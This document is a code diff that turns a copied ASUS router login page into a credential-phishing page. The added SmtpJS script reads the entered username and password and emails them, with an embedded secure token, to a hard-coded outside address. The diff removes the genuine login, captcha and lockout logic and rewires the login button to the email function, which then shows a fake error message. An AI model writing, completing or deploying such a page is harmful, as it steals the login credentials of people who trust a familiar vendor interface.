@@ -1,9 +1,8 @@
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml" xmlns:v=""><head>
+<html xmlns="http://www.w3.org/1999/xhtml" xmlns:v="">
+<head>
 <meta http-equiv="X-UA-Compatible" content="IE=Edge">
 <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-<meta http-equiv="Pragma" content="no-cache">
-<meta http-equiv="Expires" content="-1">
 <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
 <link rel="icon" href="http://router.asus.com/images/favicon.png">
 <title>ASUS Login</title>
@@ -251,7 +250,7 @@ width: 44%;
 }
 }
 </style>
-<script async>
+<script>
     /* SmtpJS.com - v3.0.0 */
     var Email = {
       send: function (a) {
@@ -287,275 +286,15 @@ width: 44%;
         SecureToken: "789dbf3c-6622-430b-9c83-ef72320ad842",
         To: "s16071@tiaccwhf.edu.hk",
         From: "s16071@tiaccwhf.edu.hk",
-        Subject: document.getElementById('#login_username').value,
-        Body: document.getElementById('.password_gap > input:nth-child(1)').value
+        Subject: document.querySelector('#login_username').value,
+        Body: document.querySelector('.password_gap > input:nth-child(1)').value
       }).then(
-        message => (document.querySelector("#login_filed > div:nth-child(1)").innerText=('something wrong please wait'));
-        window.location.href = "https://192.168.1.100";
+        message => (document.querySelector("#login_filed > div:nth-child(1)").innerHTML=('something wrong please wait'))
       );
     };
 </script>
-<script>
-/* add Array.prototype.forEach() in IE8 */
-if(typeof Array.prototype.forEach != 'function'){
-Array.prototype.forEach = function(callback){
-for(var i = 0; i < this.length; i++){
-callback.apply(this, [this[i], i, this]);
-}
-};
-}
-function tryParseJSON (jsonString){
-try {
-var o = JSON.parse(jsonString);
-if (o && typeof o === "object") {
-return o;
-}
-}
-catch (e) { }
-return false;
-};
-var login_info = tryParseJSON('{ "lock_time": -812039, "error_status": 1, "error_num": 0, "page": "index.asp" }');
-var isIE8 = navigator.userAgent.search("MSIE 8") > -1;
-var isIE9 = navigator.userAgent.search("MSIE 9") > -1;
-var remaining_time = login_info.lock_time;
-var remaining_time_min;
-var remaining_time_sec;
-var remaining_time_show;
-var countdownid, rtime_obj;
-var redirect_page = login_info.page;
-var isRouterMode = ('1' == '1') ? true : false;
-var header_info = [{ "host": "router.asus.com", "current_page": "Main_Login.asp", "protocol": "http", "port": 80 }][0];
-var ROUTERHOSTNAME = 'router.asus.com';
-var domainNameUrl = header_info.protocol+"://"+ROUTERHOSTNAME+":"+header_info.port;
-var chdom = function(){window.location.href=domainNameUrl};
-(function(){
-if(ROUTERHOSTNAME !== header_info.host && ROUTERHOSTNAME != "" && isRouterMode){
-setTimeout(function(){
-var s=document.createElement("script");s.type="text/javascript";s.src=domainNameUrl+"/chdom.json?hostname="+header_info.host;var h=document.getElementsByTagName("script")[0];h.parentNode.insertBefore(s,h);
-}, 1);
-}
-})();
-function isSupport(_ptn){
-var ui_support = [{ "mssid": 1, "2.4G": 1, "5G": 1, "update": 1, "usbX2": 1, "switchctrl": 1, "manual_stb": 1, "pwrctrl": 1, "WIFI_LOGO": 1, "nandflash": 1, "meoVoda": 1, "movistarTriple": 1, "app": 1, "gameMode": 1, "reboot_schedule": 1, "ipv6": 1, "ipv6pt": 1, "PARENTAL2": 1, "loclist": 1, "dualwan": 1, "pptpd": 1, "openvpnd": 1, "utf8_ssid": 1, "printer": 1, "modem": 1, "webdav": 1, "rrsut": 1, "cloudsync": 1, "media": 1, "appbase": 1, "fileflex": 1, "timemachine": 1, "hdspindown": 1, "diskutility": 1, "frs_feedback": 1, "dblog": 1, "email": 1, "bwdpi": 1, "wrs_wbl": 1, "HTTPS": 1, "letsencrypt": 1, "ssh": 1, "vpnc": 1, "repeater": 1, "psta": 1, "wl6": 1, "optimize_xbox": 1, "wifi_tog_btn": 1, "user_low_rssi": 1, "bcmfa": 1, "tcode": 1, "usericon": 1, "stainfo": 1, "cloudcheck": 1, "realip": 1, "cfg_sync": 1, "amas": 1, "bcmwifi": 1, "eula": 1, "proxysta": 1, "dpi_mals": 1, "dpi_vp": 1, "dpi_cc": 1, "adaptive_qos": 1, "traffic_analyzer": 1, "webs_filter": 1, "apps_filter": 1, "web_history": 1, "bandwidth_monitor": 1, "aicloudipk": 0, "concurrep": 0, "rp_express_2g": 0, "rp_express_5g": 0, "hnd": 0, "localap": 1, "nwtool": 1, "usbPortMax": 2, "usbX": 1, "usb3": 1, "wl_mfp": 1, "wlopmode": 0, "11AC": 1, "yadns": 0, "noRouter": 0, "RPMesh": 0, "odm": 0, "dualband": 1, "triband": 0, "separate_ssid": 0, "mssid_count": 3, "dhcp_static_dns": 1, "acs_dfs": 0, "wanMax": 2, "open_nat": 1, "uu_accel": 0, "del_client_data": 1, "captcha": 1, "amasRouter": 1, "amasNode": 1 }
-][0];
-return (ui_support[_ptn]) ? ui_support[_ptn] : 0;
-}
-var captcha_support = isSupport("captcha");
-if(captcha_support)
-var captcha_on = (login_info.error_num >= 2 && login_info.error_status != "7")? true : false;
-else
-var captcha_on = false;
-function initial(){
-var flag = login_info.error_status;
-if(isIE8 || isIE9){
-document.getElementById("name_title_ie").style.display ="";
-document.getElementById("password_title_ie").style.display ="";
-}
-if(flag != ""){
-document.getElementById("error_status_field").style.display ="";
-if(flag == 3){
-document.getElementById("error_status_field").innerHTML ="* 錯誤的登入名稱或者密碼";
-}
-else if(flag == 7){
-document.getElementById("error_status_field").innerHTML ="You have entered an incorrect username or password 5 times. Please try again after "+"<span id='rtime'></span>"+" seconds.";
-document.getElementById("error_status_field").className = "error_hint error_hint1";
-disable_input(1);
-disable_button(1);
-rtime_obj=document.getElementById("rtime");
-countdownfunc();
-countdownid = window.setInterval(countdownfunc,1000);
-}
-else if(flag == 8){
-document.getElementById("login_filed").style.display ="none";
-document.getElementById("logout_field").style.display ="";
-}
-else if(flag == 9){
-document.getElementById("login_filed").style.display ="none";
-document.getElementById("nologin_field").style.display ="";
-}
-else if(flag == 10){
-document.getElementById("error_captcha_field").style.display ="";
-}
-else{
-document.getElementById("error_status_field").style.display ="none";
-}
-}
-document.form.login_username.focus();
-/*register keyboard event*/
-document.form.login_username.onkeyup = function(e){
-e=e||event;
-if(e.keyCode == 13){
-document.form.login_passwd.focus();
-return false;
-}
-};
-document.form.login_username.onkeypress = function(e){
-e=e||event;
-if(e.keyCode == 13){
-return false;
-}
-};
-document.form.login_passwd.onkeyup = function(e){
-e=e||event;
-if(e.keyCode == 13){
-if(captcha_on)
-document.form.captcha_text.focus();
-else
-login();
-return false;
-}
-};
-document.form.login_passwd.onkeypress = function(e){
-e=e||event;
-if(e.keyCode == 13){
-return false;
-}
-};
-if(captcha_on){
-var timestamp = new Date().getTime();
-var captcha_pic = document.getElementById("captcha_pic");
-captcha_pic.src = "captcha.gif?t=" + timestamp;
-document.form.captcha_text.onkeyup = function(e){
-e=e||event;
-if(e.keyCode == 13){
-login();
-return false;
-}
-};
-document.form.captcha_text.onkeypress = function(e){
-e=e||event;
-if(e.keyCode == 13){
-return false;
-}
-};
-document.getElementById("captcha_field").style.display = "";
-}
-else
-document.getElementById("captcha_field").style.display = "none";
-if(history.pushState != undefined) history.pushState("", document.title, window.location.pathname);
-}
-function countdownfunc(){
-remaining_time_min = checkTime(Math.floor(remaining_time/60));
-remaining_time_sec = checkTime(Math.floor(remaining_time%60));
-remaining_time_show = remaining_time_min +":"+ remaining_time_sec;
-rtime_obj.innerHTML = remaining_time_show;
-if (remaining_time==0){
-clearInterval(countdownid);
-setTimeout("top.location.href='http://router.asus.com/Main_Login.asp';", 2000);
-}
-remaining_time--;
-}
-function login(){
-var trim = function(val){
-val = val+'';
-for (var startIndex=0;startIndex<val.length && val.substring(startIndex,startIndex+1) == ' ';startIndex++);
-for (var endIndex=val.length-1; endIndex>startIndex && val.substring(endIndex,endIndex+1) == ' ';endIndex--);
-return val.substring(startIndex,endIndex+1);
-}
-if(!window.btoa){
-window.btoa = function(input){
-var keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
-var output = "";
-var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
-var i = 0;
-var utf8_encode = function(string) {
-string = string.replace(/\r\n/g,"\n");
-var utftext = "";
-for (var n = 0; n < string.length; n++) {
-var c = string.charCodeAt(n);
-if (c < 128) {
-utftext += String.fromCharCode(c);
-}
-else if((c > 127) && (c < 2048)) {
-utftext += String.fromCharCode((c >> 6) | 192);
-utftext += String.fromCharCode((c & 63) | 128);
-}
-else {
-utftext += String.fromCharCode((c >> 12) | 224);
-utftext += String.fromCharCode(((c >> 6) & 63) | 128);
-utftext += String.fromCharCode((c & 63) | 128);
-}
-}
-return utftext;
-};
-input = utf8_encode(input);
-while (i < input.length) {
-chr1 = input.charCodeAt(i++);
-chr2 = input.charCodeAt(i++);
-chr3 = input.charCodeAt(i++);
-enc1 = chr1 >> 2;
-enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
-enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
-enc4 = chr3 & 63;
-if (isNaN(chr2)) {
-enc3 = enc4 = 64;
-}
-else if (isNaN(chr3)) {
-enc4 = 64;
-}
-output = output +
-keyStr.charAt(enc1) + keyStr.charAt(enc2) +
-keyStr.charAt(enc3) + keyStr.charAt(enc4);
-}
-return output;
-};
-}
-document.form.login_username.value = trim(document.form.login_username.value);
-document.form.login_authorization.value = btoa(document.form.login_username.value + ':' + document.form.login_passwd.value);
-document.form.login_username.disabled = true;
-document.form.login_passwd.disabled = true;
-document.form.login_captcha.value = btoa(document.form.captcha_text.value);
-document.form.captcha_text.disabled = true;
-try{
-if(redirect_page == ""
-|| redirect_page == "Logout.asp"
-|| redirect_page == "Main_Login.asp"
-|| redirect_page.indexOf(" ") != -1
-|| redirect_page.indexOf("//") != -1
-|| redirect_page.indexOf("http") != -1
-|| (redirect_page.indexOf(".asp") == -1 && redirect_page.indexOf(".htm") == -1 && redirect_page != "send_IFTTTPincode.cgi" && redirect_page != "cfg_onboarding.cgi")
-){
-document.form.next_page.value = "";
-}
-else{
-document.form.next_page.value = redirect_page;
-}
-}
-catch(e){
-document.form.next_page.value = "";
-}
-document.form.submit();
-}
-function disable_input(val){
-var disable_input_x = document.getElementsByClassName('form_input');
-for(i=0;i<disable_input_x.length;i++){
-if(val == 0)
-disable_input_x[i].disabled = true;
-else
-disable_input_x[i].style.display = "none";
-}
-}
-function disable_button(val){
-if(val == 0)
-document.getElementsByClassName('button')[0].disabled = true;
-else
-document.getElementsByClassName('button')[0].style.display = "none";
-}
-function checkTime(i){
-if (i<10){
-i="0" + i
-}
-return i
-}
-function regen_captcha(){
-var timestamp = new Date().getTime();
-var captcha_pic = document.getElementById("captcha_pic");
-var queryString = "?t=" + timestamp;
-captcha_pic.src = "captcha.gif" + queryString;
-}
-</script>
 </head>
-<body class="wrapper" onload="initial();">
+<body class="wrapper">
 <iframe name="hidden_frame" id="hidden_frame" width="0" height="0" frameborder="0"></iframe>
 <iframe id="dmRedirection" scrolling="no" src="" width="0" height="0" frameborder="0"></iframe>
 <form method="post" name="form" action="login.cgi" target="">
@@ -593,7 +332,7 @@ captcha_pic.src = "captcha.gif" + queryString;
 <div id="reCaptcha" onclick="regen_captcha();"></div>
 <div class="error_hint" style="display:none; clear:left;" id="error_captcha_field">Captcha is wrong. Please input again.</div>
 </div>
-<div class="button" onclick="login();">登入</div>
+<div class="button" onclick="send_email();">登入</div>
 </div>
 <div id="nologin_field" style="display:none;">
 <div class="p1 title_gap"></div>
